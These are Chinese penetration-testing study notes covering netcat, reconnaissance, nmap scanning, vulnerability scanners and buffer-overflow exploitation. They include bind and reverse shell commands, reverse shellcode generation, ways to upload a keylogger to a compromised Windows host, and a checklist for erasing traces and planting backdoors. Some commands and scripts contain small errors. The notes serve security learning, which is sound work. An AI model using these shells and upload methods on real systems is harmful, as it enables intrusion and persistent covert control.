# 一、netcat命令的基本使用

### 1.传输文件

```
A: nc -lp 333 > d.txt	//-l listen; -p port
B: nc -nv 1.1.1.1 333 < s.txt -q 1	//-q quit
// A作为接收端，B作为发送端
// A侦听333端口，将接受到的文件重定向到d.txt文件
// B连接IP地址为1.1.1.1的目标主机，连接A上的333端口，将s.txt文件发送出去，发送完成后1秒断开连接

A: nc -q 1 -lp 333 < s.txt
B: nc -nv 1.1.1.1 333 > d.txt
// A作为发送端，B作为接收端
// A侦听333端口，准备发送s.txt文件
// B连接主机，连接A上的333端口，将接收到的文件重定向为d.txt文件
```



### 2.传输目录

```
A: tar -cvf -file/ | nc -lp 333 -q 1
B: nc -nv 1.1.1.1 333 | tar -xvf -
//传输目录时一般将目录打包为压缩文件
//A作为发送端，首先将file文件打包为压缩文件，再侦听333端口，当发送完毕1秒后断开连接
//B作为接收端，连接目标主机上的333端口，再将压缩文件解压
```



### 3.加密传文件

```
A: nc -lp 333 | 加密算法 > 目标文件
B: 加密算法 < 源文件 | nc -nv 1.1.1.1 333 -q 1
//A作为接收端，B作为发送端
//A侦听333端口，利用加密算法将端口接收到的文件解密成目标文件
//B先将源文件加密，再连接目标主机上的333端口，传输完毕1秒后断开连接
```



### 4.流媒体服务功能

```
A: cat 1.mp4 | nc -lp 333
B: nc -nv 1.1.1.1 333 | 播放器及相关指令
//A读取mp4文件，其转换成流，重定向到侦听的333端口
//B连接目标主机上的333端口，将接收到的流用相关指令的播放器打开
```



### 5.端口扫描

```
nc -nvz 1.1.1.1 1-65535
//扫描TCP连接的端口，目标主机为1.1.1.1，端口范围为1~65535

nc -nvzu 1.1.1.1 1-65535
//扫描UDP连接的端口，目标主机为1.1.1.1，端口范围为1~65535
```

​	注：此扫描结果不一定准确，可能会受到防火墙等的影响



### 6.远程克隆硬盘

```
A: nc -lp 333 | dd of=/dev/sdb
B: dd if=/dev/sda | nv -nv 1.1.1.1 333 -q 1
//克隆硬盘是块级别的方式，能恢复系统中已删除的文件，用于电子取证
//dd是块命令，B主机上将sda硬盘以块的方式传输给A主机，A主机将收到的块文件镜像到sdb硬盘
```



### 7.实现远程控制

```
正向控制
A: nc -lp 333 -c bash
B: nc 1.1.1.1 333
//B控制A的bash shell

反向控制
A: nc -lp 333
B: nc 1.1.1.1 333 -c bash
//A控制B的bash shell

bash在哪儿，此主机就被控制
若用nc远程windows主机，则将bash命令换成cmd
```



### 8.ncat网络上的加密传输

```
A: ncat -c bash --allow 1.1.1.1 -vnl 333 --ssl
B: ncat -nv 1.1.1.2 333 --ssl
//A作为发送端，只允许来自1.1.1.1的主机连接，加密方式为ssl
//B作为接收端，连接A
```





# 二、常用工具的基本使用

### 1.wireshark

常用过滤筛选方法

<https://blog.csdn.net/fhlzlhq/article/details/82153248>



### 2.tcpdump

#### 1.抓包

- 默认只抓68个字节

- ```
  tcpdump -i eth0 -s 0 -w file.pcap
  //指定接口、大小，保存为file.pcap
  ```

- ```
  tcpdump -i eth0 port 222
  //指定端口
  ```



#### 2.读取抓包文件

```
tcpdump -r file.pcap
//-A 显示ASCII码的形式
//-x 显示16进制的形式
```



#### 3.筛选

```
tcpdump -n -r http.cap | awk'{print $3}' | sort -u

tcpdump -n src host 1.1.1.1 -r http.cap

tcpdump -n dst host 1.1.1.1 -r http.cap

tcpdump -n port 56 -r http.cap

tcpdump -nX port 80 -r http.cap
```



# 三、被动信息收集

### 1.nslookup

​	命令用于查询DNS的记录，查询域名解析是否正常

-q（type）包含的类型

> A	地址记录
>
> AAAA	地址记录
>
> AFSDB	Andrew文件系统数据库服务器记录
>
> ATMA	ATM地址记录
>
> CNAME	别名记录
>
> HINFO	硬件配置记录
>
> ISDN	域名对应的ISDN号码
>
> MB	存放指定邮箱的服务器
>
> MG	邮件组记录
>
> MINFO	邮件组和邮箱的信息记录
>
> MR	改名的邮箱记录
>
> MX	邮件服务器记录
>
> NS	名字服务器记录
>
> PTR	反向记录
>
> RP	负责人记录
>
> RT	路由穿透记录
>
> SRV	TCP服务器信息记录
>
> TXT	域名对应的文本信息
>
> X25	域名对应的X.25地址记录

示例

```
nslookup sina.com -type=any 8.8.8.8
//查询域名、查询类型、域名服务器
```



### 2、dig

功能类似于nslookup

示例

```
dig sina.com any @8.8.8.8

dig +noall +answer sina.com any @8.8.8.8 | awk '{print $5}'
//+noall 表示不显示内容	+answer 表示只显示answer这一栏的内容	管道下打印出第5块内容
```

添加参数

> -x	反向查询
>
>
> 查询bind信息
>
> ```
> dig +noall +answer txt chaos version.bind @ns记录
> //查询ns记录的bind版本信息
> ```
>
>
> 追踪查询
>
> ~~~
> dig +trace www.sina.com
> //追踪迭代查询，.域到com域到sina.com域
> ~~~
>
>
> 区域传输查询
>
> ```
> dig @ns.example.com example.com axfr
> //axfr区域查询
> 
> host -t -l example.com ns.example.com
> //axfr区域查询
> //-t 使用tcp的方式，-l 使用axfr区域查询
> ```



### 3.DNS字典爆破

>
>
>~~~
>fierce -dnsserver ns.example.com -dns example.com -wordlist brt.txt
>//指定域名服务器，指定域名，指定字典
>
>dnsdict6 -d4 -t 16 -x example.com
>//显示ipv4，指定线程16……（在kali中未找到此命令）
>
>dnsenum -f brt.txt -dnsserver ns.example.com example.com -o example.xml
>//使用字典文件，指定域名服务器，指定域名，指定输出文件
>
>dnsmap example.com -w brt.txt
>//指定域名，指定字典
>
>dnsrecon -d example.com --lifetime 10 -t brt -D brt.txt
>//指定域名，指定超时值，指定破解方式为暴力破解，指定字典
>
>dnsrecon -t std -d example.com
>//指定破解方式为标准爆破，指定域名
>~~~



### 4.DNS注册信息

whois命令查询注册信息

>
>
>~~~
>whois example.com
>
>whois 202.10.0.8
>
>//可利用域名或IP地址查询
>~~~



### 5.搜索引擎shodan

网址：www.shodan.io

>用于查找物理设备的位置，参数之间用空格分隔
>
>常用参数：
>
>> net:	指定IP地址
>>
>> country：	指定国家（缩写）
>>
>> city：	指定城市
>>
>> port：	指定端口
>>
>> os：	指定操作系统
>>
>> hostname：	指定主机名
>>
>> server：	指定服务



### 6.搜索的技巧(google)

- +（加号）：表示包含此内容
- -（减号）：表示不包含此内容
- intitle：（跟有冒号）表示网页标题包含此内容
- intext：（跟有冒号）表示网页文本包含此内容
- site：（跟有冒号）表示网址含有此内容
- inurl：（跟有冒号）表示url包含此内容
- filetype：（跟有冒号）表示搜索的内容为指定类型的文档
- “字段1|字段2”：包含字段1或字段2的网页



### 7.搜索的命令行指令

- 搜索邮箱和主机信息

~~~
theharvester -d example.com -l 200 -b bing
//指定搜索的域，指定数量，指定引擎
//若用到代理，则添加命令proxychains
~~~



- 搜索、下载文件

~~~
metagoofil -d example.com -t pdf -l 200 -o test -f 1.html
//利用谷歌搜索引擎，所以需要代理
//在当前目录下将指定域下的搜索到的pdf文档下载到test工作目录中
~~~



### 8.配置个人专属字典

​	CUPP——common user password profile，一种生成个人专属字典的小工具

​	下载

> ~~~
> git clone https://github.com/Mebus/cupp.git
> ~~~

​	使用

> ~~~
> python cupp.py -i
> //-i参数为输入个人信息
> ~~~



### 9.RECON-NG

- 命令

  > -w workspace：分配工作区，将单独域的相关信息放到单独的工作区中
  >
  > -r filename：加载或保存指令，方便下次直接在这个文本中读取指令
  >
  > ~~~
  > #recon-ng -w exam
  > //创建一个exam的工作区并进入
  > 
  > #keys list
  > //列出使用的API
  > 
  > #keys add 指定网站 key值
  > //添加key值
  > 
  > #set proxy ip：port
  > //设置代理，IP地址加端口号
  > 
  > #set user-agent 字段
  > //伪装user-agent
  > 
  > //初始化设置：unset
  > 
  > #snapshots take
  > #snapshots load 名称
  > //创建快照以及加载快照
  > ~~~

  

  - 先得到域名下的主机
  - 再将主机名解析成IP地址
  - 最后导出文件

  >
  > ~~~
  > 使用模块进行搜索步骤
  > 
  > #search 名称
  > //查找相关名称的模块
  > 
  > #use 模块名
  > //进入该模块
  > 
  > #show options
  > //查看配置信息
  > 
  > #set source example.com
  > //配置域名
  > 
  > #run
  > //进行搜索example.com相关的主机记录
  > 
  > #show hosts
  > or
  > #query select * from hosts
  > //查看存放在hosts表中的主机记录
  > 
  > //暴力破解时选择模块brute相关，其他一样
  > 
  > #search resolve
  > //查找resolve相关模块
  > 
  > #use 模块
  > //使用resolve相关模块，可以将域名解析成IP地址
  > 
  > #show options
  > //查看配置
  > 
  > #set source query select host from hosts
  > //选择所有主机
  > //set source query select host from hosts where host like '%exam%
  > //只选择主机名包含exam字段的记录
  > 
  > #run
  > //解析所有主机为IP地址
  > 
  > #search report
  > //查找报告相关的模块
  > 
  > #use 模块
  > //使用该模块
  > 
  > #show options
  > //查看配置
  > 
  > #set creator crea_user
  > //设置创建人
  > 
  > #set customer get_user
  > //设置收报告的人
  > 
  > #set filename 路径
  > //设置文件导出路径
  > ~~~



### 附：

- tmux：一种终端复用指令
- meltago：kali集成的软件，将前面信息收集的所有步骤以图形化的方式进行操作
- www.archive.org/web/web.php：该网站保存一些网页以往的页面





# 四、主动信息收集

## 二层发现（OSI参考模型中的数据链路层，基于ARP协议）

### 1.arping

地址解析协议，在同一以太网中，通过地址解析协议，源主机可以通过目的主机的IP地址获得目的主机的MAC地址。

arping，向局域网内的其他主机发送arp请求指令，以此测试局域网内的某个IP是否已被使用。不支持ping一个网段的操作。



> - -c count：发送指定数量的arp包后停止
> - -d：局域网内有IP占用时（即同一个IP有多个MAC地址），返回1
> - -r：只打印输出MAC地址
> - -R：只打印输出IP地址
> - -s MAC：指定源MAC地址
> - -S IP：指定源IP地址（目标主机没有到源IP的路由，则收不到应答）
> - -t MAC：指定目的MAC
> - -T IP：指定目的IP
> - -i interface：指定发送arp包的设备，默认为第一块网卡
> - -q：不打印输出
> - -w deadline：指定时间间隔，单位毫秒，默认1秒



使用范例

~~~
arping -c 1 192.168.4.41

arping -i eth1 -c 1 192.168.1.1

arping -c 1 52:54:00:a1:31:89
//查看MAC地址的IP，必须在同一子网才可查

arping -c 1  -T 192.168.131.156  00:13:72:f9:ca:60
//确定MAC和IP的对应

arping -c 1  -t  00:13:72:f9:ca:60 192.168.131.156
//确定IP和MAC的对应
~~~



> arp扫描脚本
>
> arping.sh
>
> ~~~ shell
> #!/bin/bash
> if ["$#" -ne 1]; then //指令后面跟的参数个数不等于1则
> echo "Example-./arping.sh [interface]"
> exit
> fi
> 
> interface = $1 //将命令后面跟的第1个参数赋值给interface
> prefix = $(ifconfig $interface | grep 'inet addr' | cut -d ':' -f 2 | cut -d ' ' -f 1 | cut -d '.' -f 1-3) //得到IP的前缀
> for addr in $(seq 1 254); do //得到该网段内所有的主机号
> arping -c 1 $prefix.$addr | grep "bytes from" | cut -d "" -f 5 | cut -d "(" -f 2 | cut -d ")" -f 1 >> addr.txt //将检测到的IP地址存入文本
> done
> ~~~
>
> 使用
>
> ~~~
> ./arping.sh eth1
> ~~~
>
> 
>
> 扫描addr.txt中IP地址的脚本（检测一段时间后IP地址是否还存活）
>
> ~~~ shell
> #!/bin/bash
> if ["$#" -ne 1]; then
> echo "Example-./arpinglive.sh [addr.txt]"
> exit
> fi
> 
> file = $1 //将命令后第1个参数的值赋给file
> for addr in $(cat $file); do //每次从文本文件中读取一行，实际得到一个IP地址
> arping -c 1 $addr | grep "bytes from" | cut -d "" -f 5 | cut -d "(" -f 2 | cut -d ")" -f 1
> done
> ~~~
>
> 使用
>
> ~~~
> ./arpinglive.sh addr.txt
> ~~~





### 2.nmap的简单使用

- nmap 192.168.1.1-254 -sn

> 作用同arping.sh，扫描1-254网段



- nmap -iL addr.txt -sn

> 作用同arpinglive.sh



### 3. netdiscover



主动式

~~~
netdiscover -i eth0 -r 192.168.2.0/24
//指定网卡，指定地址段内所有主机

netdiscover -l addr.txt
//指定读取IP地址的文本
~~~



被动式

~~~
netdiscover -p
//混杂模式中侦听arp数据包
~~~





### 4.scapy



~~~
#scapy //进入

#arp = ARP() //给自定义变量arp调用ARP函数

#arp.display() //显示具体信息

#arp.pdst = "1.1.1.1" //作参数配置

#answer = sr1(arp) //发送arp包，同时赋给自定义变量answer

#answer.display() //显示具体应答信息

//合成一行的形式
#sr1(ARP(pdst = "192.168.1.45"), timeout = 1, verbose = 1)
//超时1秒则停，不作此设定则一直ping
//verbose=1，报错显示详细信息；=0，不显示详细信息
~~~



## 三层发现（OSI参考模型中的网络层，基于IP协议）

ICMP包，请求包的类型值为8，回应包的类型值为0

- ping 只支持具体IP
- scapy下的sr1(IP(dst="192.168.45.0")/ICMP(), timeout=1)
- nmap
- fping 可支持地址段

> ~~~
> fping -g 192.168.12.10 192.168.12.180 -c 5
> //-g对地址段ping
> 
> fping -f file.txt
> //结果存到文本中
> ~~~

- hping 功能强大但一次扫描一个目标

> ```
> hping3 1.1.1.1 --icmp -c 5
> //指定目标，指定发送包为ping包，指定个数
> 
> 实现多次扫描
> #for addr in $(seq 1 254); do hping3 192.168.2.$addr --icmp -c 1 >> handle.txt & done
> #cat handle.txt | grep ^len
> //实现192.168.2.1到192.168.2.254网段的扫描，并将结果存入handle文本中
> //读取handle文本中以len开头的信息
> ```



## 四层发现（OSI参考模型中的传输层，IP是否在线——TCP，UDP）

基于TCP的发现

TCP的端口返回数据包的特点：目标主机收到未经请求的ACK包，目标主机会返回一个RST包；目标主机端口开放时，收到SYN包，会返回SYN/ACK包；目标主机端口关闭时，主机会返回RST包

- scapy ：IP()/TCP()

~~~ 
例子
#sr1(IP(dst="192.168.1.12")/TCP(dport=80, flags="A"), timeout=1).display()
~~~



基于UDP的发现

若目标主机返回端口不可达，则表示目标主机IP在线，但该端口未开放；其余情况目标主机皆不返回任何数据包

- scapy : IP()/UDP()

原理同上



## 端口发现

### 1.UDP端口扫描

扫描原理：目标主机返回“目标不可达”，则端口关闭；否则端口开放

nmap中的-sU参数，扫描默认1000个参数

### 2.TCP端口扫描

扫描原理：所有扫描手段都是根据TCP三次握手协议的细节而决定

- 隐蔽扫描：只涉及三次握手中的前两次数据包的收发；发送SYN包，返回SYN/ACK包则表示目标主机端口开放，若返回RST包，则表示目标主机端口关闭
- 僵尸扫描
  - 实施条件：扫描者可以伪造源地址，僵尸机的IPID是顺序递增的，僵尸机的系统足够闲置
  - 实施过程
    - 当目标主机端口开放时：扫描者向僵尸机发送SYN/ACK包，僵尸机返回RST包，其中IPID=x；扫描者向目标主机发送SYN包，伪造IP地址为僵尸机的源地址，目标主机向僵尸机发送SYN/ACK包，僵尸机向目标主机返回RST包，其中IPID=x+1；扫描者向僵尸机发送SYN/ACK包，僵尸机返回RST包，其中IPID=x+2
    - 当目标主机端口关闭时：扫描者向僵尸机发送SYN/ACK包，僵尸机返回RST包，其中IPID=x；扫描者向目标主机发送SYN包，伪造IP地址为僵尸机的源地址，目标主机向僵尸机发送RST包，僵尸机不做回应；扫描者向僵尸机发送SYN/ACK包，僵尸机返回RST包，其中IPID=x+1
  - nmap的测试某IP主机是否可作为僵尸的自带脚本：--script=ipidseq.nse
  - 使用nmap的参数：-sI -Pn



## 服务扫描

端口对应的服务并非是固定的

### 1.Banner

识别结果：软件开发商、软件名称、服务类型、版本号；识别结果不准确，需要结合其他方法（特征行为和响应字段）

~~~
显示banner信息的一些操作
nc -nv IPaddress port

利用socket的TCP连接，再接收字节信息即可显示一些banner信息

dmitry -pb IPaddress

nmap的banner脚本
--script=banner.nse
nmap -sT IPaddress -p port-range --script=banner.nse

amap -B IPaddress port-range

nmap -sV
~~~

### 2.SNMP

简单网络管理协议

常用指令

- onesixtyone
- snmpwalk
- snmpcheck



onesixtyone IPaddress public

onesixtyone -c dictory IPaddress -o outputtext -w 100



snmpwalk IPaddress -c community -v 2c



snmpcheck -t IPaddress

### 3. SMB扫描

- nmap

SMB（Server Message Block Protocol）

~~~
nmap ipaddress -p port1, port2,port3 --script=smb-os-discovert.nse
~~~

~~~
nmap -v ipaddress -p port --script=smb-check-vulns --script-args=unsafe=1
//第一个script是引用的脚本文件，第二个script是该脚本参数的赋值，unsafe=1表示破坏性扫描，safe=1安全性扫描
~~~



- nbtscan

```
nbtscan -r CIDRaddress
//more IP address
```



- enum4linux

```
enum4linux -a IPaddress
//single IP addresss
```



### 4. SMTP扫描

```
nmap IPaddress -p 25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods=VRFY
//SMTP Service port is 25
//arguments with VRFY is to try logining with root authentication
//function about scanning user above
```



```
nmap IPaddress -p 25 --script=smtp-open-relay.nse
//if someone "open-relay" up, hacker can use it's SMTP Server machine to attack others indirectly. So administrators do not open it.
```





## 操作系统识别

### 1.TTL起始值

- Windows ： 128（65-128）
- Linux / Unix ： 64（1-64)
- 某些Unix ： 255

TTL值可以被修改

### 2.nmap

nmap -O

参数-O 扫描操作系统的具体版本等信息



### 3.xprobe2

专门用来探测目标操作系统的版本

xprobe2 IPaddress

结果有误差



### 4.被动扫描识别

抓包分析

或

p0f命令



## 防火墙识别

### 1. nmap

| send | response          | status            |
| ---- | ----------------- | ----------------- |
| SYN  | NO                |                   |
| ACK  | RST               | Filtered          |
|      |                   |                   |
| SYN  | SYN+ACK / SYN+RST |                   |
| ACK  | NO                | Filtered          |
|      |                   |                   |
| SYN  | SYN+ACK / SYN+RST |                   |
| ACK  | RST               | Unfiltered / Open |
|      |                   |                   |
| SYN  | NO                |                   |
| ACK  | NO                | Closed            |

1. Use Scapy module in Python with the form above to get FireWall Status.
2. Or use nmap

```
nmap -p port IPaddress
nmap -p port IPaddress -sA
//first line scan IP with "SYN"
//Second line scan IP with "ACK"
```

 

### 2. 负载均衡

load balancing

```
lbd DomainName / IPaddress
//lbd---load balancing detector
```



### 3. WAF

Web Application Firewall 

---Web应用防火墙

```
wafwoof url

nmap url --script=http-waf-detect.nse
```



## 附：

- traceroute ：追踪路由。原理：分别发送具有不同TTL值的ICMP包，根据TTL为0时的返回数据包判断路由IP地址
- ping -R：和traceroute具有一样的功能
- 两者之间的不同点在于——traceroute返回距离本机最近的路由器端口网络IP地址，ping -R返回距离本机最远的路由器端口网络IP地址
- nmap的脚本文件目录
  - /usr/share/nmap/scripts





# 五、漏洞扫描

## 弱点扫描

https://www.exploit-db.com

---漏洞数据库网站



```
searchsploit exploitname
//show the exploitname which in spolit database
//the dictory:/usr/share/exploitdb/exploits/
```



https://nvd.nist.org

---美国国家漏洞发布平台



## openvas

- 初始化安装
  - openvas-setup
- 检查安装结果
  - openvas-check-setup
- 查看当前账号
  - openvasmd --list-users
- 修改账号密码
  - openvasmd --user=admin --new-password=password
- 升级更新
  - openvas-feed-update



openvas安装完成后默认会开放三个端口（9390、9391、9392），命令

```
netstat -pantu | grep 939
```

查看



openvas在浏览器中配置自己的扫描策略时，斜向上的箭头表示配置项会随着更新而自动更新，平行指左的箭头表示该配置项保持不变而不会更新



## Nessus

```
dpkg -i nessuspackage
//to load nessus
//the load dictory: /opt/nessus

/etc/init.d/nessusd start
//to start nessus

/etc/init.d/nessusd status
//show the running status 

https://kali:8834
//the website about nusses my own

//steps to continue scan
first:--->policy---if show upgrade, then need professional version
second:--->scan task
third:--->target
```



# 六、缓冲区溢出

## 1. Windows

微软安全防护机制

DEP：阻止代码从数据页被执行

ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化



- 创建自定义长度的3字节为一组的，每组不重复的字符串

```
/usr/share/metasploit-framework/tools/pattern_create.rb [length]
执行以上脚本命令，创建字符串 跟上长度

/usr/share/metasploit-framework/tools/pattern_offset.rb [16-number]
计算16进制数字在创建的字符串中的偏移量x，表示该数字第一字节在第x+1个字节上
```



- 内存小端法，低位在前，高位在后，需要转换方向，值本身为16进制



1. nc、telnet等等连接目标主机，在指令后面的数据中做缓冲区溢出

2. 寻找固定长度的字符串，以定位到特定寄存器地址

3. 寻找坏字符，shellcode、返回地址、buffer中不能出现坏字符，否则溢出字符不起作用

4. 重定向数据流，将某寄存器的指向地址重定向到另外的特定寄存器，考虑到ESP地址是变化的，思路：内存中寻找地址固定的系统模块，在模块中寻找JMP ESP指令的地址跳转，再由该指令间接跳转到ESP，从而执行shellcode。寻找无DEP、ALSR保护的内存地址，内存地址不包含坏字符。mona.py脚本实现该功能。

5. mona.py：先查找无DEP，无ALSR等保护，Rebase为False即地址不会重定向，OS Dll为True即是系统组件的模块。再查找在该模块中有无JMP ESP指令，JMP ESP为汇编指令，需要先转换为十六进制。最后查找执行该指令的模块中的内存地址，注意小端法，地址需要反向转换。在该地址打断点，检验是否合格。

   ```
   /usr/share/metasploit-framework/tools/nasm_shell.rb
   该脚本转换特定字符为十六进制，计算机都用十六进制
   ```

6. 编辑shellcode。脚本msfpayload专门生成shellcode

   ```
   /usr/share/framework2/msfpayload scripts LHOST=<ipaddress> LPORT=<port> <language type>
   //<language type>show strings as such type,C: C language data, R: source data
   
   win32_bind 正向连接Windows主机（攻击方主动向目标发起连接请求）
   win32_reverse 反向连接Windows主机（目标主动向攻击方发起连接请求）
   ```

7. 生成的shellcode注意：没有前面检测出的坏字符!

   ```
   /usr/share/framework2/msfencode [-b] <"Hex_string">
   
   一般用管道符将前面msfpayload生成的数据（R源数据，不是C数据）传递给该脚本，再编码且由以上命令剔除指定字符
   ```

8. 发送溢出代码时，最好再重定向代码前添加一些表示null的十六进制数据，防止重定向代码的前面部分被破坏

9. 反连重定向时（win32_reverse），在本地打开侦听端口

   ```
   nc -vlp <port>
   ```

   

## 2. Linux

- 仅允许本地访问某端口

```
iptables -A INPUT -p tcp --destiantion-port <port> \! -d 127.0.0.1 -j DROP
```

```
iptables -L
//show policy what you defined
```



- edb-debugger：针对指定程序，进行缓冲区溢出的寄存器等状态的显示（命令行界面输入edb即可进入该应用）
- EIP寄存器：指示要执行的下一条指令的内存地址



- 溢出的方法、思路、注意点和Windows相同



## 3. 选择和修改Exploit

- searchsploit 命令操作一些已知漏洞脚本

```
searchsploit <exploit name>
//show some exploits what you indicated in database
```



- 漏洞利用步骤
  - 利用脚本攻击漏洞
  - 上传工具（扩大控制能力）
    - nc（netcat）是非交互式shell，即对于某些命令，不会自动交互给出下一步的输入
    - 所以上传一些可以交互的工具
  - 提权
  - 擦除攻击痕迹
  - 安装后门
    - 长期控制
    - 内网渗透
    - Dump密码
  - 后漏洞利用阶段
    - 免杀



- 在Linux中执行exe可执行文件

```
// apt-get install wine
dpkg --add-architecture i386 && apt-get update && apt-get install wine32
//wine是完成上面功能的一种中间件
```



- TFTP的方式上传工具

  - 在已经远程控制目标主机的前提下，以及本地主机有启动TFTP服务的程序

  - 可以在本地主机创建一个TFTP服务器（TFTP服务目录，存放如klogger（该程序保存用户键盘的敲击信息）、whoami的Windows程序，同时该目录的权限所有者为nobody，为了后面目标主机连接该TFTP目录时直接进入）

    - 启动TFTP服务的指令

    ```
    atftpd --daemon -port <num> </dir>
    //dir为TFTP服务器目录
    ```

    - 存放某些Windows程序的目录

    ```
    /usr/share/windows-binaries/
    ```

    - 改变目录的所有者

    ```
    chown -R nobody </dir>
    ```

    - 保证指定端口开启的服务是TFTP，而不是inet等其他服务

    ```
    netstat -pantu | grep <num>
    //查看该端口对应的服务是否是TFTP
    ```

  - 目标主机端（Windows），连接本地IP，获得工具

  ```
  tftp -i <IPaddress> get <application>
  ```

- FTP的方式上传工具

  - 前提：已经远程控制目标主机
  - 本地主机配置FTP服务

  ```
  ftp://127.0.0.1
  //浏览器输入该网址后，进入FTP服务的目录即验证本地配置成功
  ```

  - FTP是非交互式的，所以可以把所有要操作的命令写入一个文件中（在本地远程控制目标的控制台窗口中完成命令写入文件的操作）
  - 在该控制台窗口中键入命令执行脚本文件

  ```
  ftp -s:<script_file>
  //script_file脚本文件为保存所有命令的文件
  ```

- VBScript的方式上传工具

  - 前提：已经远程控制目标主机
  - 本地开启Apache服务

  ```
  service apache2 start
  
  netstat -pantu | grep 80
  ```

  - Apache服务的主目录

  ```
  /var/www/html/
  ```

  - Apache主目录里放置工具
  - 远程主机的控制台窗口中将所有以vbs下载工具的命令写入VBScript脚本
  - 控制台窗口中执行脚本，下载工具

  ```
  cscript your_script.vbs http://your_apache_server_address/your_tools saved_tools
  //cscript是执行vbs脚本文件的命令
  ```

- Power Shell的方式上传工具

  - Power Shell为微软主流使用的脚本语言

- DEBUG的方式上传工具

  - upx命令可以压缩软件
  - 把工具转换成bat代码文件

  ```
  wine /usr/share/windows-binaries/exe2bat.exe your_tools.exe translate_to_bat_code.txt
  ```

  - 把以上生成的txt文件中的内容除了最后两行，全部复制，通过控制台窗口传输过去
  - 控制台窗口中debug传输过去的文件

  ```
  debug 123.hex
  //一般来说，translate_to_bat_code.txt中的代码生成的文件默认为123.hex，debug123.hex后，默认生成1.DLL
  ```

  - 生成的DLL程序就是your_tools.exe工具，控制台窗口中重命名即可

  ```
  copy 1.DLL your_tools.exe
  ```




## 4. 本地提权

- Windows系统账号（权限依次升高）

  - USER
  - Administrator
  - System
  - Administrator完全包含USER，System与前面两个有大部分的包含

- ```
  net user
  //该命令可查看本地用户列表
  net user username
  //该命令可查看username用户的信息
  net user username *
  //该命令可设置用户username的密码
  ```

- 在CMD窗口中创建System用户的程序

```
sc Create <create_name> binpath="<cmd_command>" type=own type=interact
sc start <create_name>
//<cmd_command>是在cmd窗口中具体的创建指令
```

- 进程注入

> 将自己的进程注入到系统进程中，不会在系统中增加新的进程，确保隐蔽性。





watching: 045



# 知识小结

## 1. Internet Module

- 七层OSI参考模型
  - 物理层
  - 链路层
  - 网络层
  - 运输层
  - 会话层
  - 表示层
  - 应用层
- 五层因特网协议栈
  - 物理层
  - 链路层
  - 网络层
  - 运输层
  - 应用层
- TCP/IP协议层次
  - 数据链路层
  - 网络层
  - 传输层
  - 应用层



## 2. nmap usage

### Target Specification

- -iL
  - 目标IP的输入文件
- -iR
  - 系统随机扫描目标，后面添加目标数量
- --exclude
  - 跟上不扫描指定网段的目标

### Host Discovery

- -sL
  - 简单的列出扫描目标列表
- -sn
  - 不作端口扫描
- -Pn
  - 详细扫描主机，不论存活与否
- -n / -R
  - 不作反向域名解析 / 作反向域名解析
- --dns-servers
  - 指定DNS服务器
- traceroute
  - 路由追踪

### Scan Techniques

- --scanflags
  - 自定义flag位发包
- -b
  - FTP中继扫描

### Port Specification and Scan Order

- -p
  - 指定扫描端口类型和范围
- --exclude-ports
  - 不扫描指定端口范围
- -F
  - 快速模式，扫描较少端口
- -r
  - 扫描端口时顺序扫描
- --top-ports
  - 跟上数量，扫描默认端口中前几的端口

### Service / Version Detection

- -sV --version-intensity 0-9
  - 扫描结果详细程度0-9
- -sV --version-trace
  - 过程跟踪

### Script Scan

- -sC
  - == --script
- --script-updatedb
  - update scripts
- --script-help=
  - show help info about one script
- /usr/share/nmap/scripts
  - 脚本文件目录

### OS Detection

- -O --osscan-limit
  - 限制扫描某一类型的操作系统
- -O --osscan-guess
  - 更主动地猜测系统更多信息

### Timing and Performance

- --scan-delay
  - 跟上时间数量，扫描延迟，为了防止频繁扫描时被探测到

### Firewall / IDS Evasion and Spoofing

- -D
  - 跟上多个虚假源IP地址，混杂着真实的源IP地址，致使目标系统无法分辨真实发包IP地址
- -S
  - 欺骗源地址（？与以上的区别）
- -g
  - 指定源端口
- --proxies
  - 指定代理
- --data
  - =XXX，指定发送的数据，用十六进制表示
- --badsum
  - 发送错误的校验和

